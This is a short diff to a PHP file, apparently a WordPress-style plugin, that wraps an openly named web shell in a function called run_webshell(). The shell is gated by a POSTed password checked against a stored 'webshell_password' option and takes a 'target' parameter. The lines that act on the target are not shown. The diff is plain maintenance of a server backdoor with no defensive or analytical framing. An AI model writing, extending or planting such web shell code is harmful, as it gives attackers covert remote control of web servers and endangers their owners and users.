@@ -1,5 +1,6 @@
 <?php
 
+function run_webshell(){
 if (isset($_POST['password']) && isset($_POST['target'])) {
     $password = $_POST['password'];
     if ($password != get_option('webshell_password')) {
@@ -29,4 +30,5 @@ if (isset($_POST['password']) && isset($_POST['target'])) {
     }
 } else {
     header('message: please enter password and target');
+}
 }
